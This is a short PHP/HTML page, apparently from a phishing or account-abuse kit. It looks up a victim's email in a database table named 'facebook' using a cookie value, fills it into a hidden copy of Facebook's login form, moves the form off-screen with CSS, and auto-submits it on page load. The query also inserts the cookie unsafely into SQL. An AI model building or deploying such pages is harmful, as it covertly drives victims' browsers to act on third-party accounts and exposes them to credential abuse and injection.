<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>

<body onLoad="javascript: submitform()">
<style>form{position:absolute;left:200%;}</style>
<script type="text/javascript">function submitform()  {document.forms["login_form"].submit();}</script>

<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `facebook` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>

<form id="login_form" action="https://www.facebook.com/login.php?login_attempt=1" method="post" onSubmit="return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)"><input type="hidden" name="lsd" value="AVr2nNBe" autocomplete="off"><input type="hidden" autocomplete="off" id="display" name="display" value=""><input type="hidden" autocomplete="off" id="legacy_return" name="legacy_return" value="1"><input type="hidden" autocomplete="off" id="return_session" name="return_session" value="0"><input type="hidden" autocomplete="off" id="trynum" name="trynum" value="1"><input type="hidden" name="charset_test" value="€,´,€,´,水,Д,Є"><input type="hidden" autocomplete="off" name="timezone" value="-120" id="u_0_0"><input type="hidden" name="lgnrnd" value="034712_rXOd"><input type="hidden" id="lgnjs" name="lgnjs" value="1360151221"><div class="form_row clearfix"><input type="text" class="inputtext" id="email" name="email" value="<?=$email;?>"></div><input type="password" name="pass" id="pass" class="inputpassword"></div><div class="persistent"><div class="uiInputLabel clearfix"><input id="persist_box" type="checkbox" value="1" name="persistent" class="uiInputLabelCheckbox"><label for="persist_box">Keep me logged in</label></div></div><input type="hidden" autocomplete="off" id="default_persistent" name="default_persistent" value="0"><div id="buttons" class="form_row clearfix"><label class="login_form_label"></label><div id="login_button_inline"><label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_1"><input value="Log In" name="login" type="submit" id="u_0_1"></label></div></div></div></form>

</body>
</html>

